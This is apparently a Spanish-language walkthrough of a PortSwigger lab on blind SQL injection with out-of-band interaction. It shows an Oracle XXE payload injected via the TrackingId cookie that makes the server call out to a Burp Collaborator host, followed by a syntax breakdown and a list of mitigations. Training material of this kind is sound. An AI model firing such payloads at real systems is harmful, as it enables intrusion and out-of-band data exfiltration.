# Lab: Blind SQL injection with out-of-band interaction

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The SQL query is executed asynchronously and has no effect on the application's response. However, you can trigger out-of-band interactions with an external domain.

To solve the lab, exploit the SQL injection vulnerability to cause a DNS lookup to Burp Collaborator. 

`Note`: To prevent the Academy platform being used to attack third parties, our firewall blocks interactions between the labs and arbitrary external systems. To solve the lab, you must use Burp Collaborator's default public server. 

[SQLi Cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

![Practitioner](https://img.shields.io/badge/level-Apprentice-blue)

---


`Parámetro vulnerable`: TrackingId

Objetivo: Explotar una SQLi que provoque un `DNS lookup` a Burp Collaborator.

---

Accedemos al laboratorio y nos encontramos con un shop online, el cual contiene el parámetro `TrackingId` que es vulnerable:
<img width="1514" height="826" alt="image" src="https://github.com/user-attachments/assets/637e3271-14af-46de-8237-19b831e7ab16" />



Abrimos el Burp Collaborator y hacemos click en `Copy to clipboard`:
<img width="1527" height="273" alt="image" src="https://github.com/user-attachments/assets/adb64839-0043-4385-beae-f0f3e2593476" />

Obtenemos nuestro subdominio de cliente Collaborator `3lpas3i9ldjrziy4wgzpght5zw5ntdh2.oastify.com`.

Utilizamos nuestro `Cheat sheet` y vamos probando los payloads debido a que no sabemos con qué motor de base de datos nos encontramos.

Comenzamos con el payload correspondiente a Oracle:
```sql
' || (SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://3lpas3i9ldjrziy4wgzpght5zw5ntdh2.oastify.com/"> %remote;]>'),'/l') FROM dual)--
```
Inyectamos el código:
<img width="1894" height="794" alt="image" src="https://github.com/user-attachments/assets/349a154b-511d-4c64-88ea-36e9991b44c7" />

Vemos que recibimos las peticiones en el Burp Collaborator:
<img width="1556" height="713" alt="image" src="https://github.com/user-attachments/assets/6bacd37e-2bd3-4879-9666-7c577e92133e" />

Y resolvimos el laboratorio:
<img width="1630" height="943" alt="image" src="https://github.com/user-attachments/assets/03915936-84e0-4b29-9b1d-79c494364130" />


---



# XXE / OAST en Oracle — explicación simple de la sintaxis

**Payload ejemplo**

```sql
SELECT EXTRACTVALUE(
  xmltype(
    '<?xml version="1.0" encoding="UTF-8"?>
     <!DOCTYPE root [
       <!ENTITY % remote SYSTEM "http://<UNIQUE_ID>.collaborator.net/">
       %remote;
     ]>'
  ),
  '/l'
) FROM dual;
```

## Explicación de ataque

Construye un documento XML con una entidad externa (`SYSTEM "http://..."`) y lo parsea con `xmltype`/`EXTRACTVALUE`. Al parsearlo, el parser XML intenta resolver la entidad externa y realiza una petición de red hacia el dominio controlado por el atacante — esto es la señal OOB/XXE.

---

## Desglose sintáctico

* `SELECT EXTRACTVALUE(..., '/l') FROM dual;`
  Ejecuta `EXTRACTVALUE` sobre un `xmltype` y pide el nodo XPath `/l` (aquí el valor no importa: lo relevante es que se parsea el XML).

* `xmltype('...')`
  Crea un objeto XML a partir de la cadena interna; el parser XML procesa la DTD y las entidades.

* `<?xml version="1.0" encoding="UTF-8"?>`
  Declaración estándar XML (no obligatoria para el exploit, pero habitual).

* `<!DOCTYPE root [ ... ]>`
  Define una DTD interna para el documento cuya raíz será `root`. Dentro de los corchetes `[...]` se declaran entidades.

* `<!ENTITY % remote SYSTEM "http://<UNIQUE_ID>.collaborator.net/">`
  **Define una entidad parámetro** llamada `%remote` cuya fuente (`SYSTEM`) es una URL externa. Al resolverla, el parser hará una petición a esa URL.

* `%remote;`
  **Expande la entidad**: indica al parser que incluya el contenido de `%remote` en la DTD, lo que fuerza la resolución remota.

* `'/l'` dentro de `EXTRACTVALUE`
  XPath de extracción; aquí se usa sólo para forzar el parseo del XML. No es necesario que exista `/l`.

* `FROM dual`
  En Oracle, `DUAL` es una tabla dummy que permite ejecutar expresiones sin necesidad de una tabla real.

---

## Por qué provoca una petición externa (OAST)

Al ver `SYSTEM "http://..."`, el parser intenta **cargar** el contenido de esa URL para resolver la entidad. Esa carga genera una solicitud de red (DNS/HTTP) hacia el dominio del atacante, que puede detectar y registrar la interacción.

---

## Cuándo funciona / cuándo falla

**Funciona si:**

* El parser XML permite entidades externas (XXE no mitigado).
* La red permite egress DNS/HTTP (el servidor puede resolver/llamar fuera).
* Puedes inyectar el bloque DOCTYPE en el contexto donde se evalúa `xmltype`.

**Falla si:**

* El parser tiene la resolución de entidades externas desactivada.
* La red bloquea egress o fuerza resoluciones internas.
* La aplicación sanitiza o impide insertar DOCTYPE/ENTITY.

---

## Riesgos y mitigaciones rápidas

* **Riesgo:** exfiltración de datos vía DNS/HTTP, ejecución remota de solicitudes, descubrimiento de configuración interna.
* **Mitigaciones:** desactivar resolución de entidades externas en parsers XML; validar/limitar contenido XML entrante; aplicar egress filtering (bloquear DNS/HTTP saliente no autorizado); parchear/actualizar librerías XML.



---

**Resumen:** la inyección usa una DTD con `SYSTEM` para forzar que el parser haga una llamada externa. Es una mezcla de XXE (XML External Entity) y OAST (out‑of‑band) que, cuando está permitida, permite detectar y exfiltrar información desde bases Oracle u otros parsers XML.

